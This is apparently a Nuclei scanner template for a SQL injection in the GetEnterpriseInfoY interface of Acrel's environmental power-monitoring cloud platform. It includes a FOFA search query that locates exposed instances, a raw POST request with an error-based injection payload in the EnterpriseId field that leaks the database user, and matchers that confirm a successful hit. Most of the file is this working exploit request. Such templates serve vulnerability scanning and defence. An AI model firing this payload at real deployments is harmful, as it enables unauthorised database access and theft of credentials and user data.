id: ankerui-GetEnterpriseInfoY-sql

info:
  name: "安科瑞环保用电监管云平台 GetEnterpriseInfoY 接口 SQL 注入"
  author: Unknown
  severity: high
  description: |-
    fofa: body="myCss/phone.css"
      安科瑞环保用电监管云平台 GetEnterpriseInfoY 接口存在 SQL 注入安全缺陷。攻击者可通过构造恶意请求注入任意 SQL 语句，实现对数据库的未授权访问。该漏洞允许提取敏感数据（包括但不限于管理员后台凭证、用户隐私信息），在具备高权限条件下可实施服务器端恶意代码部署，最终可能导致系统控制权沦陷。
  reference:
  - https://mp.weixin.qq.com/s/PxSStyl1t4r1RdVsxDTFpw?token=564303397&lang=zh_CN
  tags: 安科瑞环保用电监管云平台


http:
- raw:
  - |
    POST /MainMonitor/GetEnterpriseInfoY HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Accept-Encoding: gzip, deflate
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept: text/plain, */*; q=0.01

    EnterpriseId=2107265665700008%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2Cuser%28%29%29%29and%27&Type=4
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'XPATH syntax error:'
    condition: and
  - type: status
    status:
    - 200
